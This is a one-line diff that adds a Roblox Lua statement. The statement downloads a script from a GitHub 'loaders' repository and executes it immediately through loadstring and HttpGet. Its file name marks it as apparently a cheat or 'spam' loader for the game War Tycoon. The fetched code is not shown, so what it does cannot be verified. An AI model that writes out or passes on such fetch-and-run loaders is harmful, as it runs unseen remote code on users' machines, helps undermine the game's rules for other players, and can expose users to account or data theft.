@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/kf-41-war-tycoon-spam6-9geicko6ikdlv3.lua"))()
